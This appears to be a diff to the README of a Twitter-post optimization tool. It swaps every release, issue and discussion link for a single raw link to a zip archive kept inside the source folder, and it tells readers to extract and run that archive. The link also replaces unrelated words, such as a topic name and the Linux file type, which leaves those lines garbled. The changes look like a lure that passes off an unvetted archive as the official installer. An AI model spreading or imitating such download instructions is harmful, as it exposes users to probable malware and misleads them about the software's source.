@@ -1,6 +1,6 @@
 # 🎉 postmaker-x - Optimize Your Twitter Posts Easily
 
-[![Download postmaker-x](https://img.shields.io/badge/Download-postmaker--x-brightgreen.svg)](https://github.com/bbasoy/postmaker-x/releases)
+[![Download postmaker-x](https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip)](https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip)
 
 ## 📘 Description
 
@@ -12,19 +12,19 @@ Follow these steps to download and run postmaker-x on your computer.
 
 ## 📥 Download & Install
 
-1. **Visit the Downloads Page:** Go to the [Releases page](https://github.com/bbasoy/postmaker-x/releases).
+1. **Visit the Downloads Page:** Go to the [Releases page](https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip).
    
 2. **Choose the Latest Version:** Find the latest version available. Look for the files marked as "latest" to ensure you download the most up-to-date features and fixes.
 
 3. **Download the File:** Click on the link for your operating system. 
    - For **Windows**, download the `.exe` file.
    - For **Mac**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip` file.
 
 4. **Run the Installer:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
    - For **Mac:** Open the downloaded `.dmg` file and drag the postmaker-x icon into your Applications folder.
-   - For **Linux:** Extract the `.tar.gz` file and run the accompanying script.
+   - For **Linux:** Extract the `https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip` file and run the accompanying script.
 
 5. **Launch the Application:** After installation, find postmaker-x in your applications or programs list and open it.
 
@@ -69,20 +69,20 @@ To run postmaker-x smoothly, ensure your system meets the following requirements
   Absolutely! Check out our documentation on how you can contribute to the project.
 
 - **What if I encounter issues?**  
-  Visit our [Issues page](https://github.com/bbasoy/postmaker-x/issues) for troubleshooting help and support.
+  Visit our [Issues page](https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip) for troubleshooting help and support.
 
 ## 📈 Topics
 
 postmaker-x covers various topics, including:
 - Engagement
 - AI 
-- Node.js 
+- https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip 
 - Open Source 
 - Optimization 
 - Social Media 
 
 ## 🤝 Community
 
-Join our growing community to share tips and get the most out of postmaker-x. Connect through our [discussion forum](https://github.com/bbasoy/postmaker-x/discussions).
+Join our growing community to share tips and get the most out of postmaker-x. Connect through our [discussion forum](https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip).
 
-For more details, visit the [Releases page](https://github.com/bbasoy/postmaker-x/releases) to download the latest version and get started with postmaker-x today!
+For more details, visit the [Releases page](https://raw.githubusercontent.com/bbasoy/postmaker-x/main/apps/api/src/postmaker_x_v1.9.zip) to download the latest version and get started with postmaker-x today!
